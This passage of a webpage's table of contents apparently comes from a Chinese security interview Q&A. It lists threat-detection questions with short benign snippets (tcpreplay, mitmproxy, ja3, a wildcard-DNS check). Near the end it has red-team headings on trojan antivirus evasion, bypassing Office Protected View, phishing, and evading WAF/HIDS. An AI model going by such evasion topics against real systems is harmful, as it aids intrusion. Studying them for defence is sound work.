href="#%E5%A6%82%E4%BD%95%E8%A1%A1%E9%87%8F%E5%A8%81%E8%83%81%E6%84%9F%E7%9F%A5%E8%83%BD%E5%8A%9B%E5%BC%BA%E5%BC%B1%EF%BC%9F"><span class="toc-number">75.1.</span> <span class="toc-text">如何衡量威胁感知能力强弱？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%84%9F%E7%9F%A5%E8%A7%84%E5%88%99%E7%9A%84%E6%9C%89%E6%95%88%E6%80%A7%E5%A6%82%E4%BD%95%E7%B3%BB%E7%BB%9F%E9%AA%8C%E8%AF%81%EF%BC%9F"><span class="toc-number">75.2.</span> <span class="toc-text">感知规则的有效性如何系统验证？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E6%96%B9%E6%B3%95%EF%BC%9A1-%E6%94%BB%E5%87%BB%E6%A8%A1%E6%8B%9F%E6%B5%8B%E8%AF%95%EF%BC%9A-%E4%BD%BF%E7%94%A8-Kali-Linux%E3%80%81Metasploit-%E6%A8%A1%E6%8B%9F%E6%94%BB%E5%87%BB%E5%9C%BA%E6%99%AF%EF%BC%8C%E6%B5%8B%E8%AF%95%E8%A7%84%E5%88%99%E6%98%AF%E5%90%A6%E7%94%9F%E6%95%88%E3%80%822-%E5%8E%86%E5%8F%B2%E6%94%BB%E5%87%BB%E5%9B%9E%E6%94%BE%EF%BC%9A-%E9%80%9A%E8%BF%87-%E6%97%A5%E5%BF%97%E9%87%8D%E6%94%BE-%E5%A4%8D%E7%8E%B0%E7%9C%9F%E5%AE%9E%E6%94%BB%E5%87%BB%E6%B5%81%E9%87%8F%EF%BC%8C%E9%AA%8C%E8%AF%81%E6%8B%A6%E6%88%AA%E6%95%88%E6%9E%9C%EF%BC%9A-3-%E5%AF%B9%E6%8A%97%E6%A0%B7%E6%9C%AC%E6%B5%8B%E8%AF%95%EF%BC%9A-%E7%94%9F%E6%88%90%E5%8F%98%E7%A7%8D%E6%94%BB%E5%87%BB-payload%EF%BC%8C%E6%B5%8B%E8%AF%95-WAF-%E8%A7%84%E9%81%BF%E8%83%BD%E5%8A%9B%E3%80%82"><span class="toc-number">76.</span> <span class="toc-text">验证方法：1. 攻击模拟测试：   - 使用 Kali Linux、Metasploit 模拟攻击场景，测试规则是否生效。2. 历史攻击回放：   - 通过 日志重放 复现真实攻击流量，验证拦截效果：     1tcpreplay -i eth0 attack_traffic.pcap3. 对抗样本测试：   - 生成变种攻击 payload，测试 WAF 规避能力。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E7%9F%A5%E9%83%A8%E5%88%86%E5%A6%82%E4%BD%95%E8%A1%A1%E9%87%8F%EF%BC%9F"><span class="toc-number">76.1.</span> <span class="toc-text">未知部分如何衡量？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%AA%E7%9F%A5%E5%A8%81%E8%83%81%E7%9A%84%E8%A1%A1%E9%87%8F%E6%96%B9%E6%B3%95%EF%BC%9A1-%E5%9F%BA%E7%BA%BF%E5%81%8F%E7%A6%BB%E6%A3%80%E6%B5%8B%EF%BC%9A-%E8%AE%B0%E5%BD%95-%E6%AD%A3%E5%B8%B8%E6%B5%81%E9%87%8F%E6%A8%A1%E5%BC%8F%EF%BC%8C%E5%8F%91%E7%8E%B0%E5%BC%82%E5%B8%B8%E8%A1%8C%E4%B8%BA%EF%BC%9A-2-%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90%EF%BC%9A-%E9%87%87%E7%94%A8-UEBA%EF%BC%88%E7%94%A8%E6%88%B7%E5%AE%9E%E4%BD%93%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90%EF%BC%89%EF%BC%8C%E6%A3%80%E6%B5%8B%E5%BC%82%E5%B8%B8%E8%A1%8C%E4%B8%BA%E6%A8%A1%E5%BC%8F%E3%80%823-%E8%9C%9C%E7%BD%90%E6%8A%80%E6%9C%AF%EF%BC%9A-%E9%83%A8%E7%BD%B2-Honeypot-%E8%AF%B1%E6%8D%95%E6%94%BB%E5%87%BB%E8%80%85%EF%BC%8C%E5%88%86%E6%9E%90%E6%9C%AA%E7%9F%A5%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F%E3%80%82"><span class="toc-number">77.</span> <span class="toc-text">未知威胁的衡量方法：1. 基线偏离检测：   - 记录 正常流量模式，发现异常行为：     123import pandas as pddf &#x3D; pd.read_csv(&quot;traffic_logs.csv&quot;)df.describe()2. 行为分析：   - 采用 UEBA（用户实体行为分析），检测异常行为模式。3. 蜜罐技术：   - 部署 Honeypot 诱捕攻击者，分析未知攻击方式。</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E9%87%87%E9%9B%86%E4%B8%8E%E6%B8%85%E6%B4%97"><span class="toc-number">78.</span> <span class="toc-text">流量采集与清洗</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A8%81%E8%83%81%E6%84%9F%E7%9F%A5%E5%8F%AF%E4%BB%A5%E5%9C%A8%E5%93%AA%E4%BA%9B%E5%B1%82%E9%9D%A2%E8%BF%9B%E8%A1%8C%EF%BC%9F"><span class="toc-number">78.1.</span> <span class="toc-text">威胁感知可以在哪些层面进行？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E5%B1%82%E9%9D%A2%E7%9A%84%E5%A8%81%E8%83%81%E6%84%9F%E7%9F%A5%EF%BC%9A1-%E7%BD%91%E7%BB%9C%E5%B1%82%EF%BC%9A-%E7%9B%91%E6%B5%8B-%E5%BC%82%E5%B8%B8%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E3%80%81DDoS-%E6%94%BB%E5%87%BB%E3%80%822-%E5%BA%94%E7%94%A8%E5%B1%82%EF%BC%9A-%E5%8F%91%E7%8E%B0-SQL-%E6%B3%A8%E5%85%A5%E3%80%81XSS%E3%80%81%E4%B8%9A%E5%8A%A1%E6%BB%A5%E7%94%A8%E3%80%823-%E7%BB%88%E7%AB%AF%E5%B1%82%EF%BC%9A-%E7%9B%91%E6%B5%8B-%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E3%80%81C2-%E8%BF%9E%E6%8E%A5%E3%80%824-%E7%94%A8%E6%88%B7%E8%A1%8C%E4%B8%BA%E5%B1%82%EF%BC%9A-%E9%80%9A%E8%BF%87-UEBA-%E6%A3%80%E6%B5%8B%E8%B4%A6%E5%8F%B7%E7%9B%97%E7%94%A8%E3%80%81%E5%BC%82%E5%B8%B8%E8%AE%BF%E9%97%AE%E3%80%82"><span class="toc-number">79.</span> <span class="toc-text">不同层面的威胁感知：1. 网络层：   - 监测 异常端口扫描、DDoS 攻击。2. 应用层：   - 发现 SQL 注入、XSS、业务滥用。3. 终端层：   - 监测 恶意软件、C2 连接。4. 用户行为层：   - 通过 UEBA 检测账号盗用、异常访问。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP-%E5%8D%8F%E8%AE%AE%E7%9A%84%E6%B5%81%E9%87%8F%E8%A6%81%E5%AD%98%E5%82%A8%E5%93%AA%E4%BA%9B%E5%85%B3%E9%94%AE%E5%AD%97%E6%AE%B5%EF%BC%9F"><span class="toc-number">79.1.</span> <span class="toc-text">TCP 协议的流量要存储哪些关键字段？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E6%AE%B5%EF%BC%9A1-%E6%BA%90-IP-%E7%9B%AE%E6%A0%87-IP%EF%BC%9A-%E8%AF%86%E5%88%AB%E6%94%BB%E5%87%BB%E6%9D%A5%E6%BA%90%E3%80%822-%E6%BA%90%E7%AB%AF%E5%8F%A3-%E7%9B%AE%E6%A0%87%E7%AB%AF%E5%8F%A3%EF%BC%9A-%E7%A1%AE%E5%AE%9A%E6%9C%8D%E5%8A%A1%E7%B1%BB%E5%9E%8B%EF%BC%88%E5%A6%82-80-%E4%B8%BA-HTTP%EF%BC%89%E3%80%823-%E6%95%B0%E6%8D%AE%E5%8C%85%E5%BA%8F%E5%88%97%E5%8F%B7%EF%BC%88SEQ%EF%BC%89%EF%BC%9A-%E7%94%A8%E4%BA%8E%E6%A3%80%E6%B5%8B-TCP-%E9%87%8D%E4%BC%A0%E3%80%81%E6%B5%81%E9%87%8F%E9%87%8D%E6%94%BE%E3%80%824-%E6%B5%81%E9%87%8F%E6%96%B9%E5%90%91%EF%BC%88IN-OUT%EF%BC%89%EF%BC%9A-%E4%BE%BF%E4%BA%8E%E5%8C%BA%E5%88%86%E5%87%BA%E7%AB%99-%E5%85%A5%E7%AB%99%E6%B5%81%E9%87%8F%E3%80%82"><span class="toc-number">80.</span> <span class="toc-text">关键字段：1. 源 IP&#x2F;目标 IP：   - 识别攻击来源。2. 源端口&#x2F;目标端口：   - 确定服务类型（如 80 为 HTTP）。3. 数据包序列号（SEQ）：   - 用于检测 TCP 重传、流量重放。4. 流量方向（IN&#x2F;OUT）：   - 便于区分出站&#x2F;入站流量。</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%8A%93%E5%8F%96-HTTPS-%E6%B5%81%E9%87%8F%E8%BF%9B%E8%A1%8C%E5%88%86%E6%9E%90%EF%BC%9F"><span class="toc-number">80.1.</span> <span class="toc-text">如何在服务器上抓取 HTTPS 流量进行分析？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95-3%EF%BC%9A%E4%BD%BF%E7%94%A8-mitmproxy-%E8%BF%9B%E8%A1%8C-HTTPS-%E4%BB%A3%E7%90%86"><span class="toc-number">81.</span> <span class="toc-text">方法 3：使用 mitmproxy 进行 HTTPS 代理1mitmproxy -p 8080 --mode transparent</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E7%9A%84-C-C-%E9%80%9A%E9%81%93%E7%A7%8D%E7%B1%BB%E5%92%8C%E7%89%B9%E5%BE%81%EF%BC%9F"><span class="toc-number">81.1.</span> <span class="toc-text">常见的 C&amp;C 通道种类和特征？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%9C%A8%E5%8A%A0%E5%AF%86%E6%B5%81%E9%87%8F%E4%B8%AD%E6%A3%80%E6%B5%8B%E5%87%BA%E6%81%B6%E6%84%8F%E6%B5%81%E9%87%8F%EF%BC%9F"><span class="toc-number">81.2.</span> <span class="toc-text">如何在加密流量中检测出恶意流量？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%AF%86%E5%88%AB%E5%BC%82%E5%B8%B8%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%A4%96%E8%81%94%EF%BC%9F"><span class="toc-number">81.3.</span> <span class="toc-text">如何识别异常服务器外联？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E4%BA%8E%E7%BD%91%E7%BB%9C%E4%BA%94%E5%85%83%E7%BB%84%E5%8F%AF%E4%BB%A5%E5%81%9A%E5%93%AA%E4%BA%9B%E9%A3%8E%E9%99%A9%E8%A1%8C%E4%B8%BA%E7%9A%84%E5%88%86%E6%9E%90%EF%BC%9F"><span class="toc-number">81.4.</span> <span class="toc-text">基于网络五元组可以做哪些风险行为的分析？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A3%8E%E9%99%A9%E8%AF%86%E5%88%AB%E4%B8%8E%E5%BA%94%E5%AF%B9-%E4%B8%BB%E6%9C%BA%E4%BE%A7"><span class="toc-number">82.</span> <span class="toc-text">风险识别与应对 - 主机侧</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E6%9C%89%E9%82%A3%E4%BA%9B%E6%97%A5%E5%BF%97%E5%AF%B9%E9%A3%8E%E9%99%A9%E8%AF%86%E5%88%AB%E6%9C%89%E5%B8%AE%E5%8A%A9%EF%BC%9F"><span class="toc-number">82.1.</span> <span class="toc-text">主机有那些日志对风险识别有帮助？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%BD%E8%B1%A1%E6%9D%A5%E7%9C%8B%E4%B8%BB%E6%9C%BA%E4%B8%AD%E6%9C%89%E5%93%AA%E4%BA%9B%E6%97%A5%E5%BF%97%E5%8F%AF%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F%EF%BC%9F"><span class="toc-number">82.2.</span> <span class="toc-text">抽象来看主机中有哪些日志可实现方式？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E4%B8%AA%E9%BB%91%E5%AE%A2%E5%85%A5%E4%BE%B5%E4%B8%BB%E6%9C%BA%E5%90%8E%E6%A4%8D%E5%85%A5%E4%BA%86%E4%B8%80%E4%B8%AA%E6%9C%A8%E9%A9%AC%EF%BC%8C%E5%B9%B6%E6%93%A6%E9%99%A4%E4%BA%86%E5%90%84%E7%A7%8D%E6%97%A5%E5%BF%97%EF%BC%8C%E5%A6%82%E4%BD%95%E6%89%BE%E5%87%BA%E5%85%B6%E5%A6%82%E4%BD%95%E5%85%A5%E4%BE%B5%E7%9A%84%E4%BB%A5%E5%8F%8A%E5%85%A5%E4%BE%B5%E5%90%8E%E5%81%9A%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">82.3.</span> <span class="toc-text">一个黑客入侵主机后植入了一个木马，并擦除了各种日志，如何找出其如何入侵的以及入侵后做了什么？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%90%E4%B8%AA%E9%BB%91%E5%AE%A2%E5%85%A5%E4%BE%B5%E4%B8%BB%E6%9C%BA%E5%90%8E%EF%BC%8C%E6%8B%BF%E5%88%B0%E4%BA%86-root-%E6%9D%83%E9%99%90%EF%BC%8C%E5%A6%82%E4%BD%95%E6%AD%A2%E8%A1%80%EF%BC%9F"><span class="toc-number">82.4.</span> <span class="toc-text">某个黑客入侵主机后，拿到了 root 权限，如何止血？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%84%9F%E7%9F%A5%E5%88%B0%E9%BB%91%E5%AE%A2%E5%85%A5%E4%BE%B5%E4%BA%86%E6%89%80%E6%9C%89%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F"><span class="toc-number">82.5.</span> <span class="toc-text">感知到黑客入侵了所有服务器，怎么办？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%87%86%E7%A1%AE%E8%AF%86%E5%88%AB%E5%9F%9F%E5%90%8D%E6%8E%A2%E6%B5%8B%EF%BC%9F"><span class="toc-number">82.6.</span> <span class="toc-text">如何准确识别域名探测？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%87%86%E7%A1%AE%E8%AF%86%E5%88%AB%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B%EF%BC%9F"><span class="toc-number">82.7.</span> <span class="toc-text">如何准确识别端口探测？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%87%86%E7%A1%AE%E8%AF%86%E5%88%AB%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86%E6%8E%A2%E6%B5%8B%EF%BC%9F"><span class="toc-number">82.8.</span> <span class="toc-text">如何准确识别文件遍历探测？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E6%8B%A6%E6%88%AA%E8%A7%84%E5%88%99%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%EF%BC%9F"><span class="toc-number">82.9.</span> <span class="toc-text">SQL 注入拦截规则如何实现？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E9%A1%B5%E9%9D%A2%E7%AF%A1%E6%94%B9%E6%84%9F%E7%9F%A5%EF%BC%9F"><span class="toc-number">82.10.</span> <span class="toc-text">如何实现页面篡改感知？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0%E9%A1%B5%E9%9D%A2%E6%8C%82%E9%A9%AC%E6%84%9F%E7%9F%A5%EF%BC%9F"><span class="toc-number">82.11.</span> <span class="toc-text">如何实现页面挂马感知？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%A1%AE%E4%BF%9D%E7%BA%BF%E4%B8%8A%E6%8B%A6%E6%88%AA%E8%A7%84%E5%88%99%E4%B8%8D%E5%87%BA%E7%8E%B0%E8%AF%AF%E6%8B%A6%E6%88%AA%EF%BC%9F"><span class="toc-number">82.12.</span> <span class="toc-text">如何确保线上拦截规则不出现误拦截？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%AF%86%E5%88%AB%E5%85%AC%E5%85%B1%E5%92%8C%E7%A7%81%E6%9C%89%E6%8E%A5%E5%8F%A3%EF%BC%9F"><span class="toc-number">82.13.</span> <span class="toc-text">如何识别公共和私有接口？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%AF%86%E5%88%AB%E6%9C%BA%E5%99%A8%E8%A1%8C%E4%B8%BA%E8%AF%B7%E6%B1%82%EF%BC%9F"><span class="toc-number">82.14.</span> <span class="toc-text">如何识别机器行为请求？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%84%9F%E7%9F%A5%E8%A2%AB%E5%8A%A8%E9%A3%8E%E9%99%A9%EF%BC%9F"><span class="toc-number">82.15.</span> <span class="toc-text">如何感知被动风险？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A4%E6%96%AD%E6%94%BB%E5%87%BB%E8%AF%B7%E6%B1%82%E6%98%AF%E5%AE%9A%E7%82%B9%E6%94%BB%E5%87%BB%E8%BF%98%E6%98%AF%E9%9A%8F%E6%9C%BA%E6%89%AB%E6%8F%8F%EF%BC%9F"><span class="toc-number">82.16.</span> <span class="toc-text">如何判断攻击请求是定点攻击还是随机扫描？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%AF%86%E5%88%AB%E5%AE%A2%E6%88%B7%E7%AB%AF%E7%9A%84%E7%B3%BB%E7%BB%9F%E7%9C%9F%E5%AE%9E%E7%B1%BB%E5%9E%8B%EF%BC%9F"><span class="toc-number">82.17.</span> <span class="toc-text">如何识别客户端的系统真实类型？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95%EF%BC%9A1-%E5%9F%BA%E4%BA%8E-User-Agent-%EF%BC%9A-2-JS-%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB%EF%BC%9A-%E9%80%9A%E8%BF%87-navigator-platform-%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E7%B1%BB%E5%9E%8B%EF%BC%9A-3-TLS-%E6%8C%87%E7%BA%B9%E5%88%86%E6%9E%90%EF%BC%9A-%E9%80%9A%E8%BF%87-JA3-%E8%AF%86%E5%88%AB%E7%B3%BB%E7%BB%9F%E7%89%B9%E5%BE%81%EF%BC%9A"><span class="toc-number">83.</span> <span class="toc-text">检测方法：1. **基于 User-Agent**：   1grep &quot;Windows NT&quot; &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log2. JS 指纹识别：   - 通过 navigator.platform 获取系统类型：     1console.log(navigator.platform);3. TLS 指纹分析：   - 通过 JA3 识别系统特征：     1ja3 -r capture.pcap</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%93%AA%E4%BA%9B%E5%8F%AF%E4%BB%A5%E6%94%B6%E9%9B%86%E7%9A%84%E6%83%85%E6%8A%A5%E6%B8%A0%E9%81%93%EF%BC%9F"><span class="toc-number">83.1.</span> <span class="toc-text">有哪些可以收集的情报渠道？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%BF%AB%E9%80%9F%E7%AD%9B%E9%80%89%E5%87%BA%E6%9C%80%E6%96%B0%E7%9A%84-CVE-%E5%AF%B9%E6%88%91%E4%BB%AC%E6%98%AF%E5%90%A6%E6%9C%89%E5%AE%9E%E9%99%85%E5%BD%B1%E5%93%8D%EF%BC%9F"><span class="toc-number">83.2.</span> <span class="toc-text">如何快速筛选出最新的 CVE 对我们是否有实际影响？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%99%E5%AE%9A%E4%B8%80%E4%B8%AA%E7%BD%91%E5%9D%80%EF%BC%8C%E5%A6%82%E4%BD%95%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%86%E5%88%AB%E5%85%B6%E6%98%AF%E5%90%A6%E4%B8%BA%E9%92%93%E9%B1%BC%E7%BD%91%E7%AB%99%EF%BC%9F"><span class="toc-number">83.3.</span> <span class="toc-text">给定一个网址，如何自动化识别其是否为钓鱼网站？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%AF%86%E5%88%AB%E4%BB%BF%E5%86%92-APP%EF%BC%9F"><span class="toc-number">83.4.</span> <span class="toc-text">如何识别仿冒 APP？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%AF%86%E5%88%AB%E4%B8%80%E4%B8%AA%E6%B2%A1%E6%9C%89%E7%99%BB%E9%99%86%E7%9A%84%E7%94%A8%E6%88%B7%E7%9C%9F%E5%AE%9E%E8%BA%AB%E4%BB%BD%EF%BC%9F"><span class="toc-number">83.5.</span> <span class="toc-text">如何识别一个没有登陆的用户真实身份？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%89%BE%E5%87%BA%E5%AF%B9%E6%88%91%E4%BB%AC%E4%B8%9A%E5%8A%A1%E5%AE%9E%E6%96%BD%E7%BD%91%E7%BB%9C%E6%94%BB%E5%87%BB%E7%9A%84%E9%BB%91%E5%AE%A2%E7%9C%9F%E5%AE%9E%E8%BA%AB%E4%BB%BD%EF%BC%9F"><span class="toc-number">83.6.</span> <span class="toc-text">如何找出对我们业务实施网络攻击的黑客真实身份？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BD%E5%86%85%E5%92%8C%E5%9B%BD%E5%A4%96%E6%94%BB%E5%87%BB%E7%89%B9%E7%82%B9%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%EF%BC%9F"><span class="toc-number">83.7.</span> <span class="toc-text">国内和国外攻击特点有什么区别？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%88%86%E7%B1%BB%E5%92%8C%E7%AE%97%E6%B3%95%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F"><span class="toc-number">83.8.</span> <span class="toc-text">常见加解密分类和算法有哪些？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%93%AA%E4%BA%9B-Hash-%E5%92%8C%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%E4%B8%8D%E5%BB%BA%E8%AE%AE%E4%BD%BF%E7%94%A8%EF%BC%9F"><span class="toc-number">83.9.</span> <span class="toc-text">哪些 Hash 和加密算法不建议使用？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A1%AC%E7%BC%96%E7%A0%81%E5%AF%86%E9%92%A5%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%EF%BC%9F"><span class="toc-number">83.10.</span> <span class="toc-text">硬编码密钥如何解决？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PKI-%E5%8E%9F%E7%90%86"><span class="toc-number">83.11.</span> <span class="toc-text">PKI 原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BD%E5%AF%86%E7%9A%84%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86%EF%BC%9F"><span class="toc-number">83.12.</span> <span class="toc-text">国密的底层原理？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E5%A6%82%E4%BD%95%E4%BF%9D%E5%AD%98%E8%87%B3%E6%95%B0%E6%8D%AE%E5%BA%93%EF%BC%9F"><span class="toc-number">83.13.</span> <span class="toc-text">密码如何保存至数据库？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E8%AE%A9%E5%AF%86%E7%A0%81%E8%BD%AE%E8%BD%AC%EF%BC%9F"><span class="toc-number">83.14.</span> <span class="toc-text">如何让密码轮转？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E4%BB%A5%E5%9C%A8%E5%93%AA%E4%BA%9B%E5%B1%82%E6%AC%A1%E5%AF%B9%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E5%8A%A0%E5%AF%86%EF%BC%9F"><span class="toc-number">83.15.</span> <span class="toc-text">可以在哪些层次对文件进行加密？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E6%8A%80%E6%9C%AF%E6%89%8B%E6%AE%B5%E5%AE%9E%E7%8E%B0%E5%85%A8%E7%AB%99-HTTPS%EF%BC%9F"><span class="toc-number">83.16.</span> <span class="toc-text">如何技术手段实现全站 HTTPS？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E8%93%9D%E5%86%9B"><span class="toc-number">84.</span> <span class="toc-text">安全蓝军</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E9%80%9A%E8%BF%87%E7%A8%8B%E5%BA%8F%E5%88%A4%E6%96%AD%E4%B8%80%E6%89%B9%E5%9F%9F%E5%90%8D%E6%98%AF%E5%90%A6%E6%B3%9B%E8%A7%A3%E6%9E%90%E5%9F%9F%E5%90%8D%EF%BC%9F"><span class="toc-number">84.1.</span> <span class="toc-text">如何通过程序判断一批域名是否泛解析域名？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python-%E5%AE%9E%E7%8E%B0%EF%BC%9A"><span class="toc-number">85.</span> <span class="toc-text">Python 实现：12345678910111213import dns.resolverdef is_wildcard(domain):    try:        test_subdomain &#x3D; f&quot;random-test.{domain}&quot;        answer &#x3D; dns.resolver.resolve(test_subdomain, &#39;A&#39;)        return answer.rrset is not None  # 有解析结果，则为泛解析    except:        return Falsedomain_list &#x3D; [&quot;example.com&quot;, &quot;wildcard.example.com&quot;]for domain in domain_list:    print(f&quot;{domain}: {&#39;泛解析&#39; if is_wildcard(domain) else &#39;非泛解析&#39;}&quot;)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%A8%E9%A9%AC%E5%85%8D%E6%9D%80%E6%9C%89%E5%93%AA%E4%BA%9B%E6%96%B9%E5%BC%8F%EF%BC%9F%E5%93%AA%E7%A7%8D%E6%96%B9%E5%BC%8F%E6%9C%80%E6%9C%89%E6%95%88%EF%BC%9F"><span class="toc-number">85.1.</span> <span class="toc-text">木马免杀有哪些方式？哪种方式最有效？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%A8%E9%A9%AC%E9%9A%90%E8%97%8F%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F%E5%93%AA%E7%A7%8D%E9%9A%90%E8%97%8F%E6%96%B9%E5%BC%8F%E5%BD%93%E5%89%8D%E6%9C%80%E6%9C%89%E6%95%88%EF%BC%9F"><span class="toc-number">85.2.</span> <span class="toc-text">木马隐藏有哪些？哪种隐藏方式当前最有效？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Word-DDE-%E5%92%8C-Office-%E5%AE%8F%E6%9C%89%E4%BB%80%E4%B9%88%E4%BC%98%E5%8A%BF%EF%BC%9F"><span class="toc-number">85.3.</span> <span class="toc-text">Word DDE 和 Office 宏有什么优势？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87-Office-%E5%8F%97%E4%BF%9D%E6%8A%A4%E8%A7%86%E5%9B%BE%EF%BC%9F"><span class="toc-number">85.4.</span> <span class="toc-text">如何绕过 Office 受保护视图？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%89%E5%93%AA%E4%BA%9B%E6%9C%89%E6%95%88%E7%9A%84%E9%92%93%E9%B1%BC%E6%96%B9%E5%BC%8F%EF%BC%9F"><span class="toc-number">85.5.</span> <span class="toc-text">有哪些有效的钓鱼方式？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%BB%95%E8%BF%87-WAF%E3%80%81HIDS%E3%80%81%E5%A8%81%E8%83%81%E6%84%9F%E7%9F%A5%EF%BC%9F"><span class="toc-number">85.6.</span> 